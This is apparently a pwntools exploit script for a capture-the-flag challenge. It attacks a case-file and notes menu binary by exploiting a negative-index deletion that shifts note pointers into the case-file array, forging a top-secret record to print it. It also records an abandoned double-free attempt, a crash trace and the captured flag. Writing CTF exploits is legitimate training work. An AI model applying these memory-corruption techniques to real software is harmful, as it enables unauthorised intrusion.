#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
import tty

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './ecpd'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("challenges.ctfd.io", 30482)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
#b * $_pie(0x01B59)
#b * $_pie(0x1601)
#b * $_pie(0x1D6D)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

FILE_MENU = b"1"
NOTE_MENU = b"2"
MAIN_MENU = b"4"

NEW_FILE = b"1"
DEL_FILE = b"2"
PRINT_FILE = b"3"

ADD_NOTE = b"1"
DEL_NOTE = b"2"
PRINT_NOTE = b"3"

io = start()
if args.REMOTE:
    io.recvuntil(b">>")

def new_file(case_name, perp_name, perp_affil, notes):
    io.sendline(FILE_MENU)
    io.recvuntil(b">>")
    io.sendline(NEW_FILE)
    io.recvuntil(b">>")
    io.sendline(case_name)
    io.recvuntil(b">>")
    io.sendline(perp_name)
    io.recvuntil(b">>")
    io.sendline(perp_affil)
    io.recvuntil(b">>")
    io.send(notes)
    io.recvuntil(b">>")
    io.sendline(MAIN_MENU)
    io.recvuntil(b">>")

def file_submenu(case_num, suboption):
    io.sendline(FILE_MENU)
    io.recvuntil(b">>")
    io.sendline(suboption)
    io.recvuntil(b">>")
    if len(case_num) <= 2:
        io.sendline(case_num)
    else:
        io.send(case_num)
    response = io.recvuntil(b">>")
    io.sendline(MAIN_MENU)
    response += io.recvuntil(b">>")
    return response

def delete_file(case_num):
    file_submenu(case_num, DEL_FILE)

def print_file(case_num):
    response = file_submenu(case_num, PRINT_FILE)
    print(response)

def add_note(note):
    io.sendline(NOTE_MENU)
    io.recvuntil(b">>")
    io.sendline(ADD_NOTE)
    io.recvuntil(b">>")
    io.send(note)
    io.recvuntil(b">>")
    io.sendline(MAIN_MENU)
    io.recvuntil(b">>")

def note_submenu(note_num, suboption):
    io.sendline(NOTE_MENU)
    io.recvuntil(b">>")
    io.sendline(suboption)
    io.recvuntil(b">>")
    if len(note_num) <= 2:
        io.sendline(note_num)
    else:
        io.send(note_num)
    response = io.recvuntil(b">>")
    io.sendline(MAIN_MENU)
    response += io.recvuntil(b">>")
    return response

def delete_note(note_num):
    response = note_submenu(note_num, DEL_NOTE)
    if b"not found" in response:
        log.error("Note was not found!")

def print_note(note_num):
    note_submenu(note_num, PRINT_NOTE)


for _ in range(31-3):
    new_file(b"a"*8, b"b"*8, b"c"*8, b"d"*20 + b"\n")

# working loop nums 30, 50, 100, 200
#delete_note(b"-1") # add note ptr to end of g_case_files array
#delete_file(b"4")
#delete_file(b"-3") # index backwards sigsegv

# Freeing a note will underflow the reference count.
# Freeing a note also shifts all pointers in the global array upwards.
# For example, the array containing: note1 | note2 | note3 | note4
# and freeing note2 will result in the array: note1 | note3 | note4
# We can perform a structure overlap and shift a note pointer into the array of case files
# by freeing a negative index.
delete_note(b"-1")
add_note(p32(0x1) + p32(0x0) + b"FILE_TOPSEC_0000\x00" + b"\n") # separate top-chunk
add_note(p32(0x1) + p32(0x00) + b"FILE_TOPSEC_0000\x00" + b"\n") # separate top-chunk
delete_note(b"-1")
print_file(b"31")

#delete_note(b"-30")
#delete_note(b"-2") # add note ptr to end of g_case_files array
#add_note(p64(0xcafebabe) + b"\n") # separate top-chunk
#delete_note(b"-33") # double-free

io.interactive()


"""
# Tried using a double free but remote libc was 2.23
delete_note(b"-33") # double-free

# now, we have two pointers to the same chunk
new_file(b"a"*8, b"b"*8, b"c"*8, b"d"*20 + b"\n")
note = p32(0x1) # secret
note += p32(0x0) # top-secret
#note += b"flag\x00" # case-name
note += b"FILE_TOPSEC_0000\x00"
add_note(note + b"\n")

print_file(b"4")

io.interactive()
"""

"""
Which Note Number?
>> -33*** Error in `./ecpd': double free or corruption (!prev): 0x0000564eac3705a0 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7fdf70ad47f5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7fdf70add38a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fdf70ae158c]
./ecpd(+0x1ccd)[0x564eaaa5bccd]
./ecpd(+0x21c9)[0x564eaaa5c1c9]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fdf70a7d840]
./ecpd(+0x116a)[0x564eaaa5b16a]
======= Memory map: ========
"""

# flag{w3_us3d_an_AI_dec0der_r1ng}
